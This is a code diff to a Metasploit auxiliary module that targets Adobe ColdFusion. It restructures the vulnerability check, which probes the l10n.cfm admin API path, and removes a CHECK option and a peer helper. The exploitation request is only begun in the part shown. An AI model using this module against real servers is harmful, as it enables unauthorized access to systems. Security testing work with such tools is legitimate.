@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-#   http://metasploit.com/framework/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -45,13 +43,8 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptBool.new('CHECK', [false, 'Only check for vulnerability', false]),
         OptString.new("TARGETURI", [true, 'Base path to ColdFusion', '/'])
       ], self.class)
-  end
-
-  def peer
-    "#{datastore['RHOST']}:#{datastore['RPORT']}"
   end
 
   def fingerprint(response)
@@ -122,6 +115,14 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def check
+    if check_cf
+      return Msf::Exploit::CheckCode::Vulnerable
+    end
+
+    Msf::Exploit::CheckCode::Safe
+  end
+
+  def check_cf
     vuln = false
     url = '/CFIDE/adminapi/customtags/l10n.cfm'
     res = send_request_cgi({
@@ -172,21 +173,15 @@ class Metasploit3 < Msf::Auxiliary
     out, filename = fingerprint(res)
     print_status("#{peer} #{out}") if out
 
-    if(out =~ /Not Vulnerable/) 
+    if(out =~ /Not Vulnerable/)
       print_status("#{peer} isn't vulnerable to this attack")
       return
     end
 
-    if(not check)
+    if(not check_cf)
       print_status("#{peer} can't be exploited (either files missing or permissions block access)")
       return
     end
-
-    if (datastore['CHECK'] )
-      print_good("#{peer} is vulnerable and most likely exploitable") if check
-      return
-    end
-
 
     res = send_request_cgi({
       'method'   => 'GET',
